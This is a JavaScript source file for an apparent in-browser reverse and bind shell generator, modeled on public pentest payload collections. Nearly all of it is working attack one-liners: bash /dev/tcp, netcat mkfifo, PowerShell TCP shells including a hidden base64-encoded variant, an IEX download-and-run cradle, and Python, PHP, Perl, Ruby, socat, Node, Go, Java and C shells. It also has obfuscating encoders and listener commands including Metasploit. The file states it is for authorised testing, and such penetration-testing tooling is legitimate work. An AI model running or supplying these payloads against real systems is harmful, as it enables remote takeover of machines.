// Reverse / bind shell one-liners. Pure string templates: the IP, port and shell are
// substituted in the browser and nothing is ever sent anywhere. These are the well-known
// public payloads (revshells.com, PayloadsAllTheThings) for authorised testing of hosts
// you own or are allowed to test.

export const SHELLS = ['/bin/bash', '/bin/sh', '/bin/zsh', '/bin/dash', '/bin/ash', 'cmd', 'powershell', 'pwsh'];

export const ENCODINGS = [
  ['none', 'None'],
  ['url', 'URL-encode'],
  ['durl', 'Double URL-encode'],
  ['b64', 'Base64 (+ decoder)'],
];

// —— encoders ——————————————————————————————————————————————————————————————
const b64 = (s) => btoa(unescape(encodeURIComponent(s)));
const pct = (s) => s.replace(/[^A-Za-z0-9]/g, (c) => '%' + c.charCodeAt(0).toString(16).toUpperCase().padStart(2, '0'));
const base = (shell) => (shell || '/bin/sh').split(/[\\/]/).pop().replace(/\.exe$/i, '') || 'sh';

export function encode(cmd, how, shell) {
  if (how === 'url') return pct(cmd);
  if (how === 'durl') return pct(pct(cmd));
  if (how === 'b64') { const sh = base(shell) === 'cmd' ? 'bash' : base(shell); return `echo ${b64(cmd)}|base64 -d|${sh}`; }
  return cmd;
}

// UTF-16LE base64 for the PowerShell -EncodedCommand payload.
export function psB64(str) {
  let bin = '';
  for (let i = 0; i < str.length; i++) { const c = str.charCodeAt(i); bin += String.fromCharCode(c & 0xff, (c >> 8) & 0xff); }
  return btoa(bin);
}

const PS = (ip, port) => `$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
const PS_BIND = (ip, port) => `$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',${port});$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()`;

// —— payloads ————————————————————————————————————————————————————————————————
// os: nix | win | mac | any   ·   rev(o) always   ·   bind(o) optional
// o = { ip, port, shell }
export const PAYLOADS = [
  // Bash
  { id: 'bash-i', name: 'Bash -i', group: 'Bash', os: 'nix', note: 'Interactive /dev/tcp; needs a bash built with it (not dash/ash).',
    rev: (o) => `bash -i >& /dev/tcp/${o.ip}/${o.port} 0>&1` },
  { id: 'bash-196', name: 'Bash 196', group: 'Bash', os: 'nix', note: 'File descriptor 196; works where -i is flaky.',
    rev: (o) => `0<&196;exec 196<>/dev/tcp/${o.ip}/${o.port}; sh <&196 >&196 2>&196` },
  { id: 'bash-readline', name: 'Bash read line', group: 'Bash', os: 'nix', note: 'Reads a command per line; good over noisy links.',
    rev: (o) => `exec 5<>/dev/tcp/${o.ip}/${o.port};cat <&5 | while read line; do $line 2>&5 >&5; done` },
  { id: 'bash-5', name: 'Bash 5', group: 'Bash', os: 'nix',
    rev: (o) => `bash -i 5<> /dev/tcp/${o.ip}/${o.port} 0<&5 1>&5 2>&5` },
  { id: 'bash-udp', name: 'Bash /dev/udp', group: 'Bash', os: 'nix', note: 'Catch with: nc -u -lvnp <port>',
    rev: (o) => `bash -i >& /dev/udp/${o.ip}/${o.port} 0>&1` },

  // sh / nc
  { id: 'nc-mkfifo', name: 'nc mkfifo', group: 'Netcat', os: 'nix', note: 'Most portable; no -e needed.',
    rev: (o) => `rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|${o.shell} -i 2>&1|nc ${o.ip} ${o.port} >/tmp/f`,
    bind: (o) => `rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|${o.shell} -i 2>&1|nc -lvnp ${o.port} >/tmp/f` },
  { id: 'nc-e', name: 'nc -e', group: 'Netcat', os: 'nix', note: 'Needs the -e flag (not in OpenBSD nc).',
    rev: (o) => `nc ${o.ip} ${o.port} -e ${o.shell}`,
    bind: (o) => `nc -lvnp ${o.port} -e ${o.shell}` },
  { id: 'nc-c', name: 'nc -c', group: 'Netcat', os: 'nix',
    rev: (o) => `nc -c ${o.shell} ${o.ip} ${o.port}` },
  { id: 'ncat-e', name: 'ncat -e', group: 'Netcat', os: 'nix',
    rev: (o) => `ncat ${o.ip} ${o.port} -e ${o.shell}`,
    bind: (o) => `ncat -lvnp ${o.port} -e ${o.shell}` },
  { id: 'ncat-ssl', name: 'ncat TLS', group: 'Netcat', os: 'nix', note: 'Catch with: ncat --ssl -lvnp <port>',
    rev: (o) => `ncat --ssl ${o.ip} ${o.port} -e ${o.shell}` },
  { id: 'busybox-nc', name: 'busybox nc', group: 'Netcat', os: 'nix', note: 'Minimal / embedded systems.',
    rev: (o) => `rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|${o.shell} -i 2>&1|busybox nc ${o.ip} ${o.port} >/tmp/f` },
  { id: 'ncexe-e', name: 'nc.exe -e', group: 'Netcat', os: 'win', note: 'Ship nc.exe to the target first.',
    rev: (o) => `nc.exe ${o.ip} ${o.port} -e cmd.exe`,
    bind: (o) => `nc.exe -lvnp ${o.port} -e cmd.exe` },

  // PowerShell
  { id: 'ps', name: 'PowerShell #3', group: 'PowerShell', os: 'win', note: 'The common one-liner; run from cmd or a PS prompt.',
    rev: (o) => `powershell -nop -c "${PS(o.ip, o.port)}"`,
    bind: (o) => `powershell -nop -c "${PS_BIND(o.ip, o.port)}"` },
  { id: 'ps-b64', name: 'PowerShell #3 (Base64)', group: 'PowerShell', os: 'win', noEncode: true, note: 'UTF-16LE -EncodedCommand; survives quoting.',
    rev: (o) => `powershell -nop -w hidden -e ${psB64(PS(o.ip, o.port))}`,
    bind: (o) => `powershell -nop -w hidden -e ${psB64(PS_BIND(o.ip, o.port))}` },
  { id: 'ps-iex', name: 'PowerShell IEX (download)', group: 'PowerShell', os: 'win', noEncode: true, note: 'Pulls Invoke-PowerShellTcp from your host:8000.',
    rev: (o) => `powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://${o.ip}:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress ${o.ip} -Port ${o.port}"` },

  // Python
  { id: 'py-pty', name: 'Python3 (PTY)', group: 'Python', os: 'nix', note: 'Full TTY via pty.spawn.',
    rev: (o) => `export RHOST="${o.ip}";export RPORT=${o.port};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("${o.shell}")'` },
  { id: 'py-short', name: 'Python3 short', group: 'Python', os: 'nix',
    rev: (o) => `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${o.ip}",${o.port}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("${o.shell}")'` },
  { id: 'py-subprocess', name: 'Python3 subprocess', group: 'Python', os: 'any', note: 'No pty; works on Windows Python too.',
    rev: (o) => `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${o.ip}",${o.port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["${o.shell}","-i"])'` },
  { id: 'py2', name: 'Python2', group: 'Python', os: 'nix', note: 'Legacy python 2.x.',
    rev: (o) => `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${o.ip}",${o.port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["${o.shell}","-i"])'` },

  // PHP / Perl / Ruby
  { id: 'php-exec', name: 'PHP exec', group: 'PHP', os: 'nix',
    rev: (o) => `php -r '$sock=fsockopen("${o.ip}",${o.port});exec("${o.shell} <&3 >&3 2>&3");'` },
  { id: 'php-system', name: 'PHP system', group: 'PHP', os: 'nix',
    rev: (o) => `php -r '$sock=fsockopen("${o.ip}",${o.port});system("${o.shell} <&3 >&3 2>&3");'` },
  { id: 'php-shellexec', name: 'PHP shell_exec', group: 'PHP', os: 'nix',
    rev: (o) => `php -r '$sock=fsockopen("${o.ip}",${o.port});$proc=proc_open("${o.shell} -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'` },
  { id: 'perl', name: 'Perl', group: 'Perl', os: 'nix',
    rev: (o) => `perl -e 'use Socket;$i="${o.ip}";$p=${o.port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("${o.shell} -i");};'` },
  { id: 'perl-nosh', name: 'Perl (no sh)', group: 'Perl', os: 'win',
    rev: (o) => `perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"${o.ip}:${o.port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'` },
  { id: 'ruby', name: 'Ruby', group: 'Ruby', os: 'nix',
    rev: (o) => `ruby -rsocket -e'f=TCPSocket.open("${o.ip}",${o.port}).to_i;exec sprintf("${o.shell} -i <&%d >&%d 2>&%d",f,f,f)'` },
  { id: 'ruby-nosh', name: 'Ruby (no sh)', group: 'Ruby', os: 'win',
    rev: (o) => `ruby -rsocket -e 'c=TCPSocket.new("${o.ip}","${o.port}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'` },

  // socat / telnet / awk / misc
  { id: 'socat', name: 'socat', group: 'socat', os: 'nix', note: 'Catch with: socat -d -d TCP-L:<port> STDOUT',
    rev: (o) => `socat TCP:${o.ip}:${o.port} EXEC:${o.shell}` },
  { id: 'socat-tty', name: 'socat (full TTY)', group: 'socat', os: 'nix', note: 'Catch with: socat file:`tty`,raw,echo=0 TCP-L:<port>',
    rev: (o) => `socat TCP:${o.ip}:${o.port} EXEC:'${o.shell}',pty,stderr,setsid,sigint,sane` },
  { id: 'telnet', name: 'telnet', group: 'Misc', os: 'nix',
    rev: (o) => `TF=$(mktemp -u);mkfifo $TF && telnet ${o.ip} ${o.port} 0<$TF | ${o.shell} 1>$TF` },
  { id: 'awk', name: 'awk', group: 'Misc', os: 'nix',
    rev: (o) => `awk 'BEGIN {s = "/inet/tcp/0/${o.ip}/${o.port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null` },
  { id: 'zsh', name: 'zsh', group: 'Misc', os: 'nix',
    rev: (o) => `zsh -c 'zmodload zsh/net/tcp && ztcp ${o.ip} ${o.port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'` },
  { id: 'lua', name: 'Lua', group: 'Misc', os: 'nix',
    rev: (o) => `lua -e "require('socket');require('os');t=socket.tcp();t:connect('${o.ip}','${o.port}');os.execute('${o.shell} -i <&3 >&3 2>&3');"` },
  { id: 'openssl', name: 'OpenSSL (TLS)', group: 'Misc', os: 'nix', note: 'Encrypted; see the OpenSSL listener below.',
    rev: (o) => `mkfifo /tmp/s; ${o.shell} -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ${o.ip}:${o.port} > /tmp/s; rm /tmp/s` },

  // compiled
  { id: 'node', name: 'Node.js', group: 'Compiled', os: 'any',
    rev: (o) => `node -e 'sh=require("child_process").spawn("${o.shell}",[]);var c=new(require("net").Socket)();c.connect(${o.port},"${o.ip}",function(){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);});'` },
  { id: 'golang', name: 'Golang', group: 'Compiled', os: 'nix',
    rev: (o) => `echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","${o.ip}:${o.port}");cmd:=exec.Command("${o.shell}");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go` },
  { id: 'java', name: 'Java', group: 'Compiled', os: 'nix',
    rev: (o) => `String host="${o.ip}";int port=${o.port};String cmd="${o.shell}";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}};p.destroy();s.close();` },
  { id: 'c', name: 'C', group: 'Compiled', os: 'nix', note: 'Compile: gcc rev.c -o rev && ./rev',
    rev: (o) => `#include <stdio.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <unistd.h>\nint main(void){int s=socket(AF_INET,SOCK_STREAM,0);struct sockaddr_in a={0};a.sin_family=AF_INET;a.sin_port=htons(${o.port});a.sin_addr.s_addr=inet_addr("${o.ip}");connect(s,(struct sockaddr*)&a,sizeof(a));for(int i=0;i<3;i++)dup2(s,i);execl("${o.shell}","${o.shell}",NULL);return 0;}` },
];

export const GROUPS = [...new Set(PAYLOADS.map((p) => p.group))];

export function generate(payload, o, encoding, type) {
  const raw = (type === 'bind' && payload.bind) ? payload.bind(o) : payload.rev(o);
  if (payload.noEncode || type === 'bind') return raw;
  return encode(raw, encoding, o.shell);
}

// —— catchers ————————————————————————————————————————————————————————————————
// In reverse mode: the command you run to catch the shell.
// In bind mode: the command you run to connect to it.
export const LISTENERS = [
  { id: 'nc', name: 'nc', rev: (o) => `nc -lvnp ${o.port}`, bind: (o) => `nc -v ${o.ip} ${o.port}` },
  { id: 'ncat', name: 'ncat', rev: (o) => `ncat -lvnp ${o.port}`, bind: (o) => `ncat -v ${o.ip} ${o.port}` },
  { id: 'ncat-ssl', name: 'ncat (TLS)', rev: (o) => `ncat --ssl -lvnp ${o.port}`, bind: (o) => `ncat --ssl -v ${o.ip} ${o.port}` },
  { id: 'socat', name: 'socat', rev: (o) => `socat -d -d TCP-L:${o.port} STDOUT`, bind: (o) => `socat - TCP:${o.ip}:${o.port}` },
  { id: 'socat-tty', name: 'socat (full TTY)', rev: (o) => `socat file:\`tty\`,raw,echo=0 TCP-L:${o.port}`, bind: (o) => `socat file:\`tty\`,raw,echo=0 TCP:${o.ip}:${o.port}` },
  { id: 'pwncat', name: 'pwncat-cs', rev: (o) => `pwncat-cs -lp ${o.port}`, bind: (o) => `pwncat-cs ${o.ip} ${o.port}` },
  { id: 'rlwrap', name: 'rlwrap nc', rev: (o) => `rlwrap -cAr nc -lvnp ${o.port}`, bind: (o) => `rlwrap nc -v ${o.ip} ${o.port}` },
  { id: 'msf', name: 'Metasploit', rev: (o) => `msfconsole -q -x "use exploit/multi/handler; set payload generic/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT ${o.port}; run"`, bind: null },
  { id: 'openssl', name: 'OpenSSL (TLS)', rev: (o) => `openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj '/CN=example.com'; openssl s_server -quiet -key key.pem -cert cert.pem -port ${o.port}`, bind: null },
];

export function listen(listener, o, type) {
  const fn = type === 'bind' ? listener.bind : listener.rev;
  return fn ? fn(o) : null;
}